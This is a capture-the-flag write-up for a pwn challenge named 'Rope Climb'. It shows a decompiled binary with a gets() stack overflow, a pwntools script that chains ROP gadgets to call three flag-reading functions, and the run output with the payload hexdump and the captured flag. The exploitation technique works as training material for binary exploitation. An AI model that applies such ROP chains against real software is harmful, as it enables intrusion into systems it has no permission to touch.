# Rope Climb

Category: Pwn

## Description

> I heard that all you need to climb a mountain is a couple of gadgets and some rope. But the real skill is knowing where to place the gadgets along the way.

A binary was attached.

## Solution

Let's run the attached binary:

```console
┌──(user@kali3)-[/media/sf_CTFs/google/Rope_Climb]
└─$ ./chal
        _           ___ _ _           _
  /\/\ | |_ _ __   /__\ (_)_ __ ___ | |__
 /    \| __| '_ \ / /  | | | '_ ` _ \| '_ \
/ /\/\ \ |_| | | / /___| | | | | | | | |_) |
\/    \/\__|_| |_\____/|_|_|_| |_| |_|_.__/

We are at Base Camp now.
Sherpas say you are not skilled enough to climb this mountain...
Can you prove them wrong?(Maybe some rope would help?)

I guess not, byeee
```

Well, looks like we'll need to ROP attack for this one. The decompilation reveals the following
functions:

```c
undefined8 main(void)
{
  setbuf(stdin,(char *)0x0);
  setbuf(stdout,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  puts(
      "        _           ___ _ _           _     \n  /\\/\\ | |_ _ __   /__\\ (_)_ __ ___ | |__  \ n /    \\| __| \'_ \\ / /  | | | \'_ ` _ \\| \'_ \\ \n/ /\\/\\ \\ |_| | | / /___| | | | | | | | |_) |\n\\/    \\/\\__|_| |_\\____/|_|_|_| |_| |_|_.__/ \n"
      );
  if (use_helper != 0) {
    helper();
  }
  puts("We are at Base Camp now.\nSherpas say you are not skilled enough to climb this mountain...")
  ;
  vuln();
  puts("I guess not, byeee");
  return 0;
}

void vuln(void)
{
  char local_38 [48];
  
  puts("Can you prove them wrong?(Maybe some rope would help?)");
  gets(local_38);
  return;
}

void camp1(void)
{
  undefined local_38 [32];
  size_t local_18;
  FILE *local_10;
  
  local_10 = fopen("/flag.1","r");
  if (local_10 == (FILE *)0x0) {
    puts("On the road to Camp 1, you got lost in an avalanche.");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  local_18 = fread(local_38,1,0x20,local_10);
  print_buf((long)local_38,local_18);
  return;
}

void camp2(char param_1)
{
  undefined local_38 [32];
  size_t local_18;
  FILE *local_10;
  
  if (param_1 != 'g') {
    puts("You ran out of oxygen at Camp 2, you must turn back.");
                    /* WARNING: Subroutine does not return */
    exit(2);
  }
  local_10 = fopen("/flag.2","r");
  if (local_10 == (FILE *)0x0) {
    puts("Can\'t find the flag");
                    /* WARNING: Subroutine does not return */
    exit(2);
  }
  local_18 = fread(local_38,1,0x20,local_10);
  print_buf((long)local_38,local_18);
  return;
}

void summit(char param_1,int param_2)
{
  undefined local_38 [32];
  size_t local_18;
  FILE *local_10;
  
  if ((param_1 != 'c') && (param_2 != 0x7466)) {
    puts("Hey, is that Green Boots? I guess we are friends forever now.");
                    /* WARNING: Subroutine does not return */
    exit(3);
  }
  local_10 = fopen("/flag.3","r");
  if (local_10 == (FILE *)0x0) {
    puts("Can\'t find the flag");
                    /* WARNING: Subroutine does not return */
    exit(3);
  }
  local_18 = fread(local_38,1,0x20,local_10);
  print_buf((long)local_38,local_18);
  return;
}

```

So, we clearly have to exploit the buffer overflow in `vuln`, then create a ROP attack
to call `camp1()`, then `camp2('g')`, and finally `summit('c', 0x7466)`.  
It's nice to construct the ROP manually a few times, but at this point we'll just use
the `pwntools` infrastructure to save the hassle:

```python
# First, generate a template using:
#  $ pwn template --host climb.2024-bq.ctfcompetition.com --port 1337 ./chal

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No

def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    with open("/proc/sys/kernel/core_pattern") as f:
        core_pattern = f.read()
        if core_pattern.strip() == "core":
            from pathlib import Path
            raise Exception("Please run the following command first:\n"
                            "mkdir -p {0} && "
                            "sudo bash -c 'echo {0}/core_dump > /proc/sys/kernel/core_pattern'"
                            .format(Path.home() / "core"))
    os.system("rm core.* > /dev/null")
    proc = process(exe.path)
    payload = cyclic(130, n = exe.bytes)
    proc.sendline(payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n = exe.bytes )
    log.info("Overflow offset: {}".format(offset))
    return offset

overflow_offset = get_overflow_offset()

io = start()

rop = ROP(exe)
rop.call('puts', [exe.got['puts']]) # dummy call, align stack for XMM
rop.camp1()
rop.camp2(ord('g'))
rop.summit(ord('c'), 0x7466)

log.info("ROP Chain:\n{}".format(rop.dump()))

payload = fit({
     overflow_offset: bytes(rop)
})

io.recvuntil(b"Can you prove them wrong?(Maybe some rope would help?)")

log.info("Sending payload:\n{}".format(hexdump(payload)))
io.sendline(payload)

print(io.recvall())
```

Output:

```console
┌──(user@kali3)-[/media/sf_CTFs/google/Rope_Climb]
└─$ python3 exploit.py
[*] '/media/sf_CTFs/google/Rope_Climb/chal'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[+] Starting local process '/media/sf_CTFs/google/Rope_Climb/chal': pid 100204
[*] Process '/media/sf_CTFs/google/Rope_Climb/chal' stopped with exit code -11 (SIGSEGV) (pid 100204)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/google/Rope_Climb/core.100204'
    Arch:      amd64-64-little
    RIP:       0x4013c9
    RSP:       0x7ffd87b77238
    Exe:       '/media/sf_CTFs/google/Rope_Climb/chal' (0x400000)
    Fault:     0x6161616161616168
[*] Overflow offset: 56
[+] Opening connection to climb.2024-bq.ctfcompetition.com on port 1337: Done
[*] Loaded 7 cached gadgets for './chal'
[*] ROP Chain:
    0x0000:         0x40118a pop rdi; ret
    0x0008:         0x404008 [arg0] rdi = got.puts
    0x0010:         0x401040 puts
    0x0018:         0x4011d7 camp1()
    0x0020:         0x40118a pop rdi; ret
    0x0028:             0x67 [arg0] rdi = 103
    0x0030:         0x401253 camp2
    0x0038:         0x40118c pop rsi; ret
    0x0040:           0x7466 [arg1] rsi = 29798
    0x0048:         0x40118a pop rdi; ret
    0x0050:             0x63 [arg0] rdi = 99
    0x0058:         0x4012f3 summit
[*] Sending payload:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  69 61 61 61  6a 61 61 61  6b 61 61 61  6c 61 61 61  │iaaa│jaaa│kaaa│laaa│
    00000030  6d 61 61 61  6e 61 61 61  8a 11 40 00  00 00 00 00  │maaa│naaa│··@·│····│
    00000040  08 40 40 00  00 00 00 00  40 10 40 00  00 00 00 00  │·@@·│····│@·@·│····│
    00000050  d7 11 40 00  00 00 00 00  8a 11 40 00  00 00 00 00  │··@·│····│··@·│····│
    00000060  67 00 00 00  00 00 00 00  53 12 40 00  00 00 00 00  │g···│····│S·@·│····│
    00000070  8c 11 40 00  00 00 00 00  66 74 00 00  00 00 00 00  │··@·│····│ft··│····│
    00000080  8a 11 40 00  00 00 00 00  63 00 00 00  00 00 00 00  │··@·│····│c···│····│
    00000090  f3 12 40 00  00 00 00 00                            │··@·│····│
    00000098
[+] Receiving all data: Done (53B)
[*] Closed connection to climb.2024-bq.ctfcompetition.com port 1337
b'\nP>\xd7"\xec{\nCTF{n0w_i7_1s_T1m3_t0_r0p_b4Ck_d0wN_53ca29f5}'
```